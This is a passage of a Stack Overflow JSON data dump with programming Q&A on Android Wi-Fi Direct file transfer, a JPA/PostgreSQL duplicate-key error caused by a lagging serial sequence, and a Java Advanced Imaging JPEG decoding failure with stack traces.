true;\n}\n</code></pre>\n"}],"owner":{"account_id":9162597,"reputation":114,"user_id":6813449,"display_name":"Mans"},"comment_count":1,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":742,"favorite_count":0,"down_vote_count":0,"up_vote_count":1,"answer_count":1,"score":1,"last_activity_date":1640256962,"creation_date":1473428449,"question_id":39412934,"body_markdown":"I want to make an app which sends a file via Wi-Fi direct. I followed the instruction in &lt;a href=&quot;https://developer.android.com/guide/topics/connectivity/wifip2p.html&quot;&gt;here&lt;/a&gt; and learned how to discover and connect to a device but I have some problem with the code which is used to transfer files.\r\n\r\nOne of those parts:\r\n\r\n    InputStream inputstream = client.getInputStream();\r\n\r\nI can&#39;t understand what does this code do.\r\n\r\nOr:\r\n\r\n    copyFile(inputstream, new FileOutputStream(f));\r\n\r\nThe problem is Android Studio couldn&#39;t find `copyFile` method.(Is this a custom method??)\r\n\r\nPlease help me with these 2 problems and also give a detailed info for the first one.","title":"Android-How to transfer a file via wifi direct?","body":"<p>I want to make an app which sends a file via Wi-Fi direct. I followed the instruction in <a href=\"https://developer.android.com/guide/topics/connectivity/wifip2p.html\" rel=\"nofollow\">here</a> and learned how to discover and connect to a device but I have some problem with the code which is used to transfer files.</p>\n\n<p>One of those parts:</p>\n\n<pre><code>InputStream inputstream = client.getInputStream();\n</code></pre>\n\n<p>I can't understand what does this code do.</p>\n\n<p>Or:</p>\n\n<pre><code>copyFile(inputstream, new FileOutputStream(f));\n</code></pre>\n\n<p>The problem is Android Studio couldn't find <code>copyFile</code> method.(Is this a custom method??)</p>\n\n<p>Please help me with these 2 problems and also give a detailed info for the first one.</p>\n"},{"tags":["java","spring-boot","spring-data-jpa","spring-data","liquibase"],"answers":[{"tags":[],"owner":{"account_id":1310803,"reputation":2557,"user_id":1258838,"accept_rate":68,"display_name":"Juliyanage Silva"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1640253023,"creation_date":1640253023,"answer_id":70460330,"question_id":70459704,"body_markdown":"Try saving the role first and then add it to Org and then save the Org:\r\n\r\n    Organization created = save(organization);\r\n        Role role = new Role();\r\n        role.setCode(&quot;test&quot;);\r\n        save(role); // this assign a persistant primary key to the role\r\n        created.getRoles().add(role);\r\n        return save(created);","title":"Duplicate key value on saving child entities","body":"<p>Try saving the role first and then add it to Org and then save the Org:</p>\n<pre><code>Organization created = save(organization);\n    Role role = new Role();\n    role.setCode(&quot;test&quot;);\n    save(role); // this assign a persistant primary key to the role\n    created.getRoles().add(role);\n    return save(created);\n</code></pre>\n"},{"tags":[],"owner":{"account_id":476019,"reputation":14699,"user_id":886697,"accept_rate":92,"display_name":"Stanislav Bashkyrtsev"},"down_vote_count":0,"up_vote_count":1,"is_accepted":true,"score":1,"last_activity_date":1640256200,"creation_date":1640254446,"answer_id":70460628,"question_id":70459704,"body_markdown":"This doesn&#39;t have to do with MTM. Such situation is possible only if your PK sequence (serial) got behind some how, and now it generates keys that already exist in the table. Couple of ideas why this might have happened:\r\n\r\n* You recreated the sequence associated with the serial, so it starts from 1 again. But there weren&#39;t records with IDs up until 15, so first 14 inserts were successful.\r\n* You inserted records with an explicit ID specified instead of using `serial` functionality. Here is how you can reproduce the problem (2nd insert causes problems down the road):\r\n\r\n```sql\r\ndrop table if exists org;\r\ncreate table org (\r\n    id serial,\r\n    name text,\r\n    constraint org_pk primary key (id)\r\n);\r\n\r\ninsert into org(name) values(&#39;name1&#39;); -- works fine\r\ninsert into org(id, name) values(2, &#39;name2&#39;); -- we don&#39;t use the sequence\r\ninsert into org(name) values(&#39;name3&#39;);-- sequence generates 2 again and insert fails\r\n```\r\n\r\n\r\nYou need to find who screws up the sequence/who inserts rows with the ID specified. And update that place:\r\n\r\n1. Either don&#39;t specify the IDs at all - serial will do this for you\r\n2. Or access sequence explicitly in the insert statement:\r\n```sql\r\ninsert into org(id, name) values(nextval(&#39;org_id_seq&#39;), &#39;name2&#39;);\r\n```\r\n3. Or [update the sequence][1] with setval() after you inserted the rows.\r\n\r\n\r\n  [1]: https://hcmc.uvic.ca/blogs/index.php/how_to_fix_postgresql_error_duplicate_ke?blog=22","title":"Duplicate key value on saving child entities","body":"<p>This doesn't have to do with MTM. Such situation is possible only if your PK sequence (serial) got behind some how, and now it generates keys that already exist in the table. Couple of ideas why this might have happened:</p>\n<ul>\n<li>You recreated the sequence associated with the serial, so it starts from 1 again. But there weren't records with IDs up until 15, so first 14 inserts were successful.</li>\n<li>You inserted records with an explicit ID specified instead of using <code>serial</code> functionality. Here is how you can reproduce the problem (2nd insert causes problems down the road):</li>\n</ul>\n<pre class=\"lang-sql prettyprint-override\"><code>drop table if exists org;\ncreate table org (\n    id serial,\n    name text,\n    constraint org_pk primary key (id)\n);\n\ninsert into org(name) values('name1'); -- works fine\ninsert into org(id, name) values(2, 'name2'); -- we don't use the sequence\ninsert into org(name) values('name3');-- sequence generates 2 again and insert fails\n</code></pre>\n<p>You need to find who screws up the sequence/who inserts rows with the ID specified. And update that place:</p>\n<ol>\n<li>Either don't specify the IDs at all - serial will do this for you</li>\n<li>Or access sequence explicitly in the insert statement:</li>\n</ol>\n<pre class=\"lang-sql prettyprint-override\"><code>insert into org(id, name) values(nextval('org_id_seq'), 'name2');\n</code></pre>\n<ol start=\"3\">\n<li>Or <a href=\"https://hcmc.uvic.ca/blogs/index.php/how_to_fix_postgresql_error_duplicate_ke?blog=22\" rel=\"nofollow noreferrer\">update the sequence</a> with setval() after you inserted the rows.</li>\n</ol>\n"}],"owner":{"account_id":13341930,"reputation":13,"user_id":9629904,"display_name":"butters"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":1112,"favorite_count":0,"down_vote_count":0,"up_vote_count":1,"accepted_answer_id":70460628,"answer_count":2,"score":1,"last_activity_date":1640256200,"creation_date":1640249643,"question_id":70459704,"body_markdown":"When i&#39;m trying to save an entitiy (Role) of ManyToMany relation, id of child entity is generated incorrectly, and i&#39;m receiving DataIntegrityViolationException.\r\n\r\nPart of saving parent entity with child:\r\n\r\n    public Organization create(Organization organization) {\r\n            Organization created = save(organization);\r\n            Role role = new Role();\r\n            role.setCode(&quot;test&quot;);\r\n            created.getRoles().add(role);\r\n            return save(created);\r\n        }\r\n\r\nHibernate debug and exception:\r\n\r\n    Hibernate: insert into organization (company_code, full_legal_name, id) values (?, ?, ?)\r\n    Hibernate: insert into role (code, description, read_only, reserved) values (?, ?, ?, ?)\r\n    2021-12-23 10:34:50.459  WARN 13464 --- [           main] o.h.engine.jdbc.spi.SqlExceptionHelper   : SQL Error: 0, SQLState: 23505\r\n    2021-12-23 10:34:50.459 ERROR 13464 --- [           main] o.h.engine.jdbc.spi.SqlExceptionHelper   : ERROR: duplicate key value violates unique constraint &quot;role_pkey&quot;\r\n      Detail: Key (id)=(15) already exists.\r\n\r\nParent entity:\r\n\r\n    @Entity        \r\n    public class Organization {\r\n\r\n        @Id\r\n        Long id;\r\n    \r\n        @ManyToMany(cascade = {CascadeType.ALL}, fetch= FetchType.EAGER)\r\n        @JoinTable(name = &quot;organization_role&quot;,\r\n                joinColumns = @JoinColumn(name = &quot;organization_id&quot;),\r\n                inverseJoinColumns = @JoinColumn(name = &quot;role_id&quot;))\r\n        Set&lt;Role&gt; roles = new HashSet&lt;&gt;();\r\n        }\r\n\r\n\r\nRole entity:\r\n\r\n    @Entity\r\n    public class Role implements Serializable {\r\n    \r\n        @Id\r\n        @GeneratedValue(strategy = GenerationType.IDENTITY)\r\n        private Integer id;\r\n    }\r\n\r\n\r\nLiquibase tables:\r\nRole:\r\n\r\n    CREATE TABLE role\r\n    (\r\n        id          SERIAL                                    NOT NULL,\r\n        code        VARCHAR(32)                               NOT NULL,\r\n        CONSTRAINT role_pkey PRIMARY KEY (id)\r\n    );\r\n\r\nOrganization:\r\n\r\n    CREATE TABLE organization (\r\n        id bigint NOT NULL,\r\n        CONSTRAINT organization_pkey PRIMARY KEY (id)\r\n    );\r\n\r\nOrganization-Role:\r\n\r\n    CREATE TABLE organization_role (\r\n        role_id INTEGER  NOT NULL,\r\n        organization_id BIGINT NOT NULL,\r\n        CONSTRAINT fk_organization_role_role FOREIGN KEY (role_id) REFERENCES role(id),\r\n        CONSTRAINT fk_organization_role_organization FOREIGN KEY (organization_id) REFERENCES organization(id),\r\n        CONSTRAINT user_organization_pkey PRIMARY KEY (role_id, organization_id)\r\n    );","title":"Duplicate key value on saving child entities","body":"<p>When i'm trying to save an entitiy (Role) of ManyToMany relation, id of child entity is generated incorrectly, and i'm receiving DataIntegrityViolationException.</p>\n<p>Part of saving parent entity with child:</p>\n<pre><code>public Organization create(Organization organization) {\n        Organization created = save(organization);\n        Role role = new Role();\n        role.setCode(&quot;test&quot;);\n        created.getRoles().add(role);\n        return save(created);\n    }\n</code></pre>\n<p>Hibernate debug and exception:</p>\n<pre><code>Hibernate: insert into organization (company_code, full_legal_name, id) values (?, ?, ?)\nHibernate: insert into role (code, description, read_only, reserved) values (?, ?, ?, ?)\n2021-12-23 10:34:50.459  WARN 13464 --- [           main] o.h.engine.jdbc.spi.SqlExceptionHelper   : SQL Error: 0, SQLState: 23505\n2021-12-23 10:34:50.459 ERROR 13464 --- [           main] o.h.engine.jdbc.spi.SqlExceptionHelper   : ERROR: duplicate key value violates unique constraint &quot;role_pkey&quot;\n  Detail: Key (id)=(15) already exists.\n</code></pre>\n<p>Parent entity:</p>\n<pre><code>@Entity        \npublic class Organization {\n\n    @Id\n    Long id;\n\n    @ManyToMany(cascade = {CascadeType.ALL}, fetch= FetchType.EAGER)\n    @JoinTable(name = &quot;organization_role&quot;,\n            joinColumns = @JoinColumn(name = &quot;organization_id&quot;),\n            inverseJoinColumns = @JoinColumn(name = &quot;role_id&quot;))\n    Set&lt;Role&gt; roles = new HashSet&lt;&gt;();\n    }\n</code></pre>\n<p>Role entity:</p>\n<pre><code>@Entity\npublic class Role implements Serializable {\n\n    @Id\n    @GeneratedValue(strategy = GenerationType.IDENTITY)\n    private Integer id;\n}\n</code></pre>\n<p>Liquibase tables:\nRole:</p>\n<pre><code>CREATE TABLE role\n(\n    id          SERIAL                                    NOT NULL,\n    code        VARCHAR(32)                               NOT NULL,\n    CONSTRAINT role_pkey PRIMARY KEY (id)\n);\n</code></pre>\n<p>Organization:</p>\n<pre><code>CREATE TABLE organization (\n    id bigint NOT NULL,\n    CONSTRAINT organization_pkey PRIMARY KEY (id)\n);\n</code></pre>\n<p>Organization-Role:</p>\n<pre><code>CREATE TABLE organization_role (\n    role_id INTEGER  NOT NULL,\n    organization_id BIGINT NOT NULL,\n    CONSTRAINT fk_organization_role_role FOREIGN KEY (role_id) REFERENCES role(id),\n    CONSTRAINT fk_organization_role_organization FOREIGN KEY (organization_id) REFERENCES organization(id),\n    CONSTRAINT user_organization_pkey PRIMARY KEY (role_id, organization_id)\n);\n</code></pre>\n"},{"tags":["java","javax.imageio","jai"],"comments":[{"owner":{"account_id":17690939,"reputation":81,"user_id":12842720,"display_name":"Bharath"},"score":0,"creation_date":1637646258,"post_id":68495141,"comment_id":123875193,"body_markdown":"Hi Preethi,  did you get any answer?. iam facing the same issue","body":"Hi Preethi,  did you get any answer?. iam facing the same issue"}],"answers":[{"tags":[],"owner":{"account_id":480589,"reputation":133,"user_id":893908,"display_name":"oliverbachmann"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1640255961,"creation_date":1640201890,"answer_id":70454301,"question_id":68495141,"body_markdown":"You will have to try a bunch of jai_codec.jar, jai_core.jar from different locations in the net and also make sure to have mlibwrapper installed. You can concentrate on version 1.13. If it&#39;s not working then it&#39;s because you are using a different version of the jars.","title":"OpenJDK Java: JAI &quot;Error: One factory fails for the operation &quot;jpeg&quot;&quot;","body":"<p>You will have to try a bunch of jai_codec.jar, jai_core.jar from different locations in the net and also make sure to have mlibwrapper installed. You can concentrate on version 1.13. If it's not working then it's because you are using a different version of the jars.</p>\n"}],"owner":{"account_id":12434282,"reputation":155,"user_id":9055255,"display_name":"preethi selvaraju"},"comment_count":1,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":1272,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":1,"score":0,"last_activity_date":1640255961,"creation_date":1627023149,"question_id":68495141,"body_markdown":"The below sample program failed to run and throwing exception shown in error segment. \r\n\r\n```\r\nOS: Solaris 11\r\nJava Version: OpenJDK 8\r\nJAI: JAI libraries got from geosolutions not from Oracle. jai_codec.jar, jai_core.jar, jai-imageio-core-1.4.0.jar and mlibwrapper.jar.\r\n```\r\nJAI-Ext: https://github.com/geosolutions-it/jai-ext/wiki\r\n\r\nJAISample.java:\r\n```\r\nimport java.awt.Frame;\r\nimport java.awt.image.renderable.ParameterBlock;\r\nimport java.io.IOException;\r\nimport javax.media.jai.Interpolation;\r\nimport javax.media.jai.JAI;\r\nimport javax.media.jai.RenderedOp;\r\nimport com.sun.media.jai.codec.FileSeekableStream;\r\nimport javax.media.jai.widget.ScrollingImagePanel;\r\n/**\r\n * This program decodes an image file of any JAI supported\r\n * formats, such as GIF, JPEG, TIFF, BMP, PNM, PNG, into a\r\n * RenderedImage, scales the image by 2X with bilinear\r\n * interpolation, and then displays the result of the scale\r\n * operation.\r\n */\r\npublic class JAISampleProgram {\r\n /** The main method. */\r\n public static void main(String[] args) {\r\n /* Validate input. */\r\n// if (args.length != 1) {\r\n//System.out.println(&quot;Usage: java JAISampleProgram input_image_filename&quot;);\r\n// System.exit(-1);\r\n// }\r\n /*\r\n * Create an input stream from the specified file name\r\n * to be used with the file decoding operator.\r\n */\r\n FileSeekableStream stream = null;\r\n try {\r\n stream = new FileSeekableStream(&quot;/opt/XRX_NEXGENBLACK/current/IPMC/SFM20/images/SFM_174_0_0_0.jpg&quot;);\r\n } catch (IOException e) {\r\n e.printStackTrace();\r\n System.exit(0);\r\n }\r\n /* Create an operator to decode the image file. */\r\n RenderedOp image1 = JAI.create(&quot;stream&quot;, stream);\r\n /*\r\n* Create a standard bilinear interpolation object to be\r\n * used with the scale operator.\r\n */\r\n Interpolation interp = Interpolation.getInstance(\r\nInterpolation.INTERP_BILINEAR);\r\n /**\r\n* Stores the required input source and parameters in a\r\n* ParameterBlock to be sent to the operation registry,\r\n * and eventually to the scale operator.\r\n */\r\n ParameterBlock params = new ParameterBlock();\r\n params.addSource(image1);\r\n params.add(2.0F); // x scale factor\r\n params.add(2.0F); // y scale factor\r\n params.add(0.0F); // x translate\r\n params.add(0.0F); // y translate\r\n params.add(interp); // interpolation method\r\n /* Create an operator to scale image1. */\r\n RenderedOp image2 = JAI.create(&quot;scale&quot;, params);\r\n /* Get the width and height of image2. */\r\n int width = image2.getWidth();\r\n int height = image2.getHeight();\r\n/* Attach image2 to a scrolling panel to be displayed. */\r\n ScrollingImagePanel panel = new ScrollingImagePanel(\r\nimage2, width, height);\r\n /* Create a frame to contain the panel. */\r\n Frame window = new Frame(&quot;JAI Sample Program&quot;);\r\n window.add(panel);\r\n window.pack();\r\n window.show();\r\n }\r\n}\r\n```\r\n\r\nError:\r\n\r\n```\r\nError: One factory fails for the operation &quot;jpeg&quot;\r\nOccurs in: javax.media.jai.ThreadSafeOperationRegistry\r\njava.lang.reflect.InvocationTargetException\r\n        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\r\n        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)\r\n        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\r\n        at java.lang.reflect.Method.invoke(Method.java:498)\r\n        at javax.media.jai.FactoryCache.invoke(FactoryCache.java:122)\r\n        at javax.media.jai.OperationRegistry.invokeFactory(OperationRegistry.java:1674)\r\n        at javax.media.jai.ThreadSafeOperationRegistry.invokeFactory(ThreadSafeOperationRegistry.java:473)\r\n        at javax.media.jai.registry.RIFRegistry.create(RIFRegistry.java:332)\r\n        at com.sun.media.jai.opimage.StreamRIF.create(StreamRIF.java:102)\r\n        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\r\n        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)\r\n        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\r\n        at java.lang.reflect.Method.invoke(Method.java:498)\r\n        at javax.media.jai.FactoryCache.invoke(FactoryCache.java:122)\r\n        at javax.media.jai.OperationRegistry.invokeFactory(OperationRegistry.java:1674)\r\n        at javax.media.jai.ThreadSafeOperationRegistry.invokeFactory(ThreadSafeOperationRegistry.java:473)\r\n        at javax.media.jai.registry.RIFRegistry.create(RIFRegistry.java:332)\r\n        at javax.media.jai.RenderedOp.createInstance(RenderedOp.java:819)\r\n        at javax.media.jai.RenderedOp.createRendering(RenderedOp.java:867)\r\n        at javax.media.jai.RenderedOp.getRendering(RenderedOp.java:888)\r\n        at javax.media.jai.RenderedOp.createInstance(RenderedOp.java:799)\r\n        at javax.media.jai.RenderedOp.createRendering(RenderedOp.java:867)\r\n        at javax.media.jai.RenderedOp.getWidth(RenderedOp.java:2179)\r\n        at JAISampleProgram.main(JAISampleProgram.java:58)\r\nCaused by: java.lang.NoClassDefFoundError: com/sun/image/codec/jpeg/ImageFormatException\r\n        at com.sun.media.jai.codecimpl.JPEGImageDecoder.decodeAsRenderedImage(JPEGImageDecoder.java:46)\r\n        at com.sun.media.jai.opimage.CodecRIFUtil.create(CodecRIFUtil.java:88)\r\n        at com.sun.media.jai.opimage.JPEGRIF.create(JPEGRIF.java:43)\r\n        ... 24 more\r\nCaused by: java.lang.ClassNotFoundException: com.sun.image.codec.jpeg.ImageFormatException\r\n        at java.net.URLClassLoader.findClass(URLClassLoader.java:382)\r\n        at java.lang.ClassLoader.loadClass(ClassLoader.java:418)\r\n        at java.lang.ClassLoader.loadClass(ClassLoader.java:351)\r\n        ... 27 more\r\nError: One factory fails for the operation &quot;stream&quot;\r\nOccurs in: javax.media.jai.ThreadSafeOperationRegistry\r\njava.lang.reflect.InvocationTargetException\r\n        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\r\n        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)\r\n        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\r\n        at java.lang.reflect.Method.invoke(Method.java:498)\r\n        at javax.media.jai.FactoryCache.invoke(FactoryCache.java:122)\r\n        at javax.media.jai.OperationRegistry.invokeFactory(OperationRegistry.java:1674)\r\n        at javax.media.jai.ThreadSafeOperationRegistry.invokeFactory(ThreadSafeOperationRegistry.java:473)\r\n        at javax.media.jai.registry.RIFRegistry.create(RIFRegistry.java:332)\r\n        at javax.media.jai.RenderedOp.createInstance(RenderedOp.java:819)\r\n        at javax.media.jai.RenderedOp.createRendering(RenderedOp.java:867)\r\n        at javax.media.jai.RenderedOp.getRendering(RenderedOp.java:888)\r\n        at javax.media.jai.RenderedOp.createInstance(RenderedOp.java:799)\r\n        at javax.media.jai.RenderedOp.createRendering(RenderedOp.java:867)\r\n        at javax.media.jai.RenderedOp.getWidth(RenderedOp.java:2179)\r\n        at JAISampleProgram.main(JAISampleProgram.java:58)\r\nCaused by: javax.media.jai.util.ImagingException: All factories fail for the operation &quot;jpeg&quot;\r\n        at javax.media.jai.OperationRegistry.invokeFactory(OperationRegistry.java:1687)\r\n        at javax.media.jai.ThreadSafeOperationRegistry.invokeFactory(ThreadSafeOperationRegistry.java:473)\r\n        at javax.media.jai.registry.RIFRegistry.create(RIFRegistry.java:332)\r\n        at com.sun.media.jai.opimage.StreamRIF.create(StreamRIF.java:102)\r\n        ... 15 more\r\nCaused by: java.lang.reflect.InvocationTargetException\r\n        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\r\n        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)\r\n        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\r\n        at java.lang.reflect.Method.invoke(Method.java:498)\r\n        at javax.media.jai.FactoryCache.invoke(FactoryCache.java:122)\r\n        at javax.media.jai.OperationRegistry.invokeFactory(OperationRegistry.java:1674)\r\n        ... 18 more\r\nCaused by: java.lang.NoClassDefFoundError: com/sun/image/codec/jpeg/ImageFormatException\r\n        at com.sun.media.jai.codecimpl.JPEGImageDecoder.decodeAsRenderedImage(JPEGImageDecoder.java:46)\r\n        at com.sun.media.jai.opimage.CodecRIFUtil.create(CodecRIFUtil.java:88)\r\n        at com.sun.media.jai.opimage.JPEGRIF.create(JPEGRIF.java:43)\r\n        ... 24 more\r\nCaused by: java.lang.ClassNotFoundException: com.sun.image.codec.jpeg.ImageFormatException\r\n        at java.net.URLClassLoader.findClass(URLClassLoader.java:382)\r\n        at java.lang.ClassLoader.loadClass(ClassLoader.java:418)\r\n        at java.lang.ClassLoader.loadClass(ClassLoader.java:351)\r\n        ... 27 more\r\nException in thread &quot;main&quot; javax.media.jai.util.ImagingException: All factories fail for the operation &quot;stream&quot;\r\n        at javax.media.jai.OperationRegistry.invokeFactory(OperationRegistry.java:1687)\r\n        at javax.media.jai.ThreadSafeOperationRegistry.invokeFactory(ThreadSafeOperationRegistry.java:473)\r\n        at javax.media.jai.registry.RIFRegistry.create(RIFRegistry.java:332)\r\n        at javax.media.jai.RenderedOp.createInstance(RenderedOp.java:819)\r\n        at javax.media.jai.RenderedOp.createRendering(RenderedOp.java:867)\r\n        at javax.media.jai.RenderedOp.getRendering(RenderedOp.java:888)\r\n        at javax.media.jai.RenderedOp.createInstance(RenderedOp.java:799)\r\n        at javax.media.jai.RenderedOp.createRendering(RenderedOp.java:867)\r\n        at javax.media.jai.RenderedOp.getWidth(RenderedOp.java:2179)\r\n        at JAISampleProgram.main(JAISampleProgram.java:58)\r\nCaused by: java.lang.reflect.InvocationTargetException\r\n        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\r\n        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)\r\n        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\r\n        at java.lang.reflect.Method.invoke(Method.java:498)\r\n        at javax.media.jai.FactoryCache.invoke(FactoryCache.java:122)\r\n        at javax.media.jai.OperationRegistry.invokeFactory(OperationRegistry.java:1674)\r\n        ... 9 more\r\nCaused by: javax.media.jai.util.ImagingException: All factories fail for the operation &quot;jpeg&quot;\r\n        at javax.media.jai.OperationRegistry.invokeFactory(OperationRegistry.java:1687)\r\n        at javax.media.jai.ThreadSafeOperationRegistry.invokeFactory(ThreadSafeOperationRegistry.java:473)\r\n        at javax.media.jai.registry.RIFRegistry.create(RIFRegistry.java:332)\r\n        at com.sun.media.jai.opimage.StreamRIF.create(StreamRIF.java:102)\r\n        ... 15 more\r\nCaused by: java.lang.reflect.InvocationTargetException\r\n        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\r\n        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)\r\n        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\r\n        at java.lang.reflect.Method.invoke(Method.java:498)\r\n        at javax.media.jai.FactoryCache.invoke(FactoryCache.java:122)\r\n        at javax.media.jai.OperationRegistry.invokeFactory(OperationRegistry.java:1674)\r\n        ... 18 more\r\nCaused by: java.lang.NoClassDefFoundError: com/sun/image/codec/jpeg/ImageFormatException\r\n        at com.sun.media.jai.codecimpl.JPEGImageDecoder.decodeAsRenderedImage(JPEGImageDecoder.java:46)\r\n        at com.sun.media.jai.opimage.CodecRIFUtil.create(CodecRIFUtil.java:88)\r\n        at com.sun.media.jai.opimage.JPEGRIF.create(JPEGRIF.java:43)\r\n        ... 24 more\r\nCaused by: java.lang.ClassNotFoundException: com.sun.image.codec.jpeg.ImageFormatException\r\n        at java.net.URLClassLoader.findClass(URLClassLoader.java:382)\r\n        at java.lang.ClassLoader.loadClass(ClassLoader.java:418)\r\n        at java.lang.ClassLoader.loadClass(ClassLoader.java:351)\r\n        ... 27 more\r\nCaused by:\r\njava.lang.reflect.InvocationTargetException\r\n        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\r\n        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)\r\n        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\r\n        at java.lang.reflect.Method.invoke(Method.java:498)\r\n        at javax.media.jai.FactoryCache.invoke(FactoryCache.java:122)\r\n        at javax.media.jai.OperationRegistry.invokeFactory(OperationRegistry.java:1674)\r\n        at javax.media.jai.ThreadSafeOperationRegistry.invokeFactory(ThreadSafeOperationRegistry.java:473)\r\n        at javax.media.jai.registry.RIFRegistry.create(RIFRegistry.java:332)\r\n        at javax.media.jai.RenderedOp.createInstance(RenderedOp.java:819)\r\n        at javax.media.jai.RenderedOp.createRendering(RenderedOp.java:867)\r\n        at javax.media.jai.RenderedOp.getRendering(RenderedOp.java:888)\r\n        at javax.media.jai.RenderedOp.createInstance(RenderedOp.java:799)\r\n        at javax.media.jai.RenderedOp.createRendering(RenderedOp.java:867)\r\n        at javax.media.jai.RenderedOp.getWidth(RenderedOp.java:2179)\r\n        at JAISampleProgram.main(JAISampleProgram.java:58)\r\nCaused by: javax.media.jai.util.ImagingException: All factories fail for the operation &quot;jpeg&quot;\r\n        at javax.media.jai.OperationRegistry.invokeFactory(OperationRegistry.java:1687)\r\n        at javax.media.jai.ThreadSafeOperationRegistry.invokeFactory(ThreadSafeOperationRegistry.java:473)\r\n        at javax.media.jai.registry.RIFRegistry.create(RIFRegistry.java:332)\r\n        at com.sun.media.jai.opimage.StreamRIF.create(StreamRIF.java:102)\r\n        ... 15 more\r\nCaused by: java.lang.reflect.InvocationTargetException\r\n        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\r\n        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)\r\n        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\r\n        at java.lang.reflect.Method.invoke(Method.java:498)\r\n        at javax.media.jai.FactoryCache.invoke(FactoryCache.java:122)\r\n        at javax.media.jai.OperationRegistry.invokeFactory(OperationRegistry.java:1674)\r\n        ... 18 more\r\nCaused by: java.lang.NoClassDefFoundError: com/sun/image/codec/jpeg/ImageFormatException\r\n        at com.sun.media.jai.codecimpl.JPEGImageDecoder.decodeAsRenderedImage(JPEGImageDecoder.java:46)\r\n        at com.sun.media.jai.opimage.CodecRIFUtil.create(CodecRIFUtil.java:88)\r\n        at com.sun.media.jai.opimage.JPEGRIF.create(JPEGRIF.java:43)\r\n        ... 24 more\r\nCaused by: java.lang.ClassNotFoundException: com.sun.image.codec.jpeg.ImageFormatException\r\n        at java.net.URLClassLoader.findClass(URLClassLoader.java:382)\r\n        at java.lang.ClassLoader.loadClass(ClassLoader.java:418)\r\n        at java.lang.ClassLoader.loadClass(ClassLoader.java:351)\r\n        ... 27 more\r\n\r\n\r\n\r\n\r\n\r\n\r\n1626371845 Error: Could not find mediaLib accelerator wrapper classes. Continuing in pure Java mode.\r\n1626371845 Occurs in: com.sun.media.jai.mlib.MediaLibAccessor\r\njava.lang.NoClassDefFoundError: com/sun/medialib/mlib/Image\r\nat com.sun.media.jai.mlib.MediaLibAccessor$1.run(MediaLibAccessor.java:248)\r\nat java.security.AccessController.doPrivileged(Native Method)\r\nat com.sun.media.jai.mlib.MediaLibAccessor.setUseMlib(MediaLibAccessor.java:245)\r\nat com.sun.media.jai.mlib.MediaLibAccessor.useMlib(MediaLibAccessor.java:177)\r\nat com.sun.media.jai.mlib.MediaLibAccessor.isMediaLibCompatible(MediaLibAccessor.java:357)\r\nat com.sun.media.jai.mlib.MediaLibAccessor.isMediaLibCompatible(MediaLibAccessor.java:315)\r\nat com.sun.media.jai.mlib.MlibScaleRIF.create(MlibScaleRIF.java:67)\r\nat sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\r\nat sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)\r\nat sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\r\nat java.lang.reflect.Method.invoke(Method.java:498)\r\nat javax.media.jai.FactoryCache.invoke(FactoryCache.java:122)\r\nat javax.media.jai.OperationRegistry.invokeFactory(OperationRegistry.java:1674)\r\nat javax.media.jai.ThreadSafeOperationRegistry.invokeFactory(ThreadSafeOperationRegistry.java:473)\r\nat javax.media.jai.registry.RIFRegistry.create(RIFRegistry.java:332)\r\nat javax.media.jai.RenderedOp.createInstance(RenderedOp.java:819)\r\nat javax.media.jai.RenderedOp.createRendering(RenderedOp.java:867)\r\nat javax.media.jai.RenderedOp.getWidth(RenderedOp.java:2179)\r\nat com.sun.media.jai.widget.DisplayJAI.set(DisplayJAI.java:144)\r\nat com.xerox.controller.commonGUI.ImageViewer.scaleImage(ImageViewer.java:1677)\r\nat com.xerox.controller.commonGUI.ImageViewer.displayPage(ImageViewer.java:1400)\r\nat com.xerox.controller.commonGUI.ImageViewer.createPage(ImageViewer.java:2008)\r\nat com.xerox.controller.commonGUI.ImageViewer.updatePageCount(ImageViewer.java:2186)\r\nat com.xerox.controller.commonGUI.ImageViewer$ViewJobListener.handleEvent(ImageViewer.java:2357)\r\nat com.xerox.controller.util.EventDispatcher.serviceListeners(EventDispatcher.java:151)\r\nat 